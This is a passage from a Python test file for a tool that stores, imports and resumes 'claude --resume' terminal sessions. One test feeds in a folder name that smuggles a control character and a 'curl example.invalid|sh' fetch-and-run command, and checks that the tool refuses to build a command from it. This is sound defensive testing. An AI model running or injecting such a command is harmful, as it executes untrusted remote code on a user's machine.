    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_import_leaves_saved_rows_it_did_not_touch(env):
    # Two kept sessions of one project and title is a normal state: Keep
    # does not replace. An import that adds nothing to that group leaves both.
    for sid in (SID_A, SID_B):
        _bind(sid, "api")
        _seen(env, sid)
        rs.close_session(env["conn"], sid, "other")
    rs.keep(env["conn"], SID_A)  # closing SID_B replaced it, Keep brings it back
    rs.rename(env["conn"], SID_A, "first")
    rs.rename(env["conn"], SID_B, "second")
    before = {r["session_id"]: (r["saved"], r["custom_name"]) for r in rs.list_sessions(env["conn"])}
    rs.import_items(env["conn"], [], [])
    after = {r["session_id"]: (r["saved"], r["custom_name"]) for r in rs.list_sessions(env["conn"])}
    assert after == before == {SID_A: (True, "first"), SID_B: (True, "second")}


def test_no_command_for_a_folder_with_a_control_character(env):
    # The panels type the command into a terminal. A Ctrl+U and a carriage
    # return in a folder name would erase the cd and run the rest.
    _seen(env, SID_A, cwd="/work/a\x15curl example.invalid|sh\r")
    rs.close_session(env["conn"], SID_A, "other")
    assert rs.get_session(env["conn"], SID_A)["command"] is None


def test_import_twice_changes_nothing_the_second_time(env):
    item = {"id": "x2", "name": "scratch", "cwd": "/w", "command": f"claude --resume {SID_B}", "closed": EPOCH}
    rs.import_items(env["conn"], [], [item])
    before = rs.list_sessions(env["conn"])
    assert rs.import_items(env["conn"], [], [item])["imported"] == 0
    assert rs.list_sessions(env["conn"]) == before


def test_unsave_moves_a_saved_row_to_closed_and_drops_its_pin(env):
    _bind(SID_A, "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.set_pinned(env["conn"], SID_A, True)
    assert rs.unsave(env["conn"], SID_A)
    row = rs.get_session(env["conn"], SID_A)
    assert (row["saved"], row["pinned"]) == (False, False)
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_cli_import_with_a_broken_file_imports_nothing(env, monkeypatch, capsys, tmp_path):
    folder = tmp_path / "panels"
    folder.mkdir()
    (folder / "saved.json").write_text(json.dumps(
        [{"id": "x", "name": "a", "cwd": "/w", "command": f"claude --resume {SID_A}"}]))
    (folder / "recent.json").write_text("{not json")
    with pytest.raises(SystemExit) as exit_:
        _cli(monkeypatch, "import-iterm", str(folder))
    assert exit_.value.code == 1
    assert "cannot read" in capsys.readouterr().out
    assert rs.get_session(env["conn"], SID_A) is None


def test_cli_import_from_a_folder_with_neither_file_fails(env, monkeypatch, capsys, tmp_path):
    with pytest.raises(SystemExit) as exit_:
        _cli(monkeypatch, "import-iterm", str(tmp_path / "typo"))
    assert exit_.value.code == 1
    assert "no saved.json or recent.json" in capsys.readouterr().out


def test_cli_import_reports_counts_and_skips(env, monkeypatch, capsys, tmp_path):
    folder = tmp_path / "panels"
    folder.mkdir()
    (folder / "saved.json").write_text(json.dumps([
        {"id": "x", "name": "a", "cwd": "/w", "command": f"claude --resume {SID_A}"},
        {"id": "y", "name": "logs", "cwd": "/var/log", "command": ""}]))
    _cli(monkeypatch, "import-iterm", str(folder))
    out = capsys.readouterr().out
    assert "Imported 1" in out and "Skipped (no claude --resume command): logs" in out
